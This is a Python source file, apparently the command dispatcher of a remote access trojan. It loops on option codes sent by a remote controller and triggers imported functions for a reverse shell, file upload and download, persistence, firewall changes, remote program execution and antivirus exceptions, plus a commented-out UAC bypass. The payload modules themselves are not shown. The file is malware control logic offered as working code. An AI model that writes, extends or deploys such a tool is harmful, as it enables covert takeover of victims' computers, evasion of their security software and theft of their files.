from core.utils import display_msg
from core.features.antivirus import add_exception
from core.features.shell import run_reverse_shell
from core.features.persistence import become_persistent
from core.features.firewall import modify_firewall
from core.features.filetransfer import download, upload
from core.features.appexecute import execute_app
import time

def connection_handler(client):
    # print("[+] handling connection")
    active_connection = True

    while active_connection:
        option = client.recv()
        
        if option == "1":
            display_msg("Running Reverse Shell")
            run_reverse_shell(client)
        elif option == "2":
            download(client)
        elif option == "3":
            upload(client)
        elif option =="4":
            become_persistent(client)
        elif option == "5":
            modify_firewall(client)
        elif option == "6":
            execute_app(client)
        # elif option == "7":
            # try_UAC_bypass()
        elif option == "7":
            add_exception(client)


        elif option == "exit" or option == "99" or option == "stop" or option == "quit":
            display_msg("Exiting", "y")
            break
        else:
            display_msg("Invalid option, try again", "r")
            time.sleep(2)

                            

    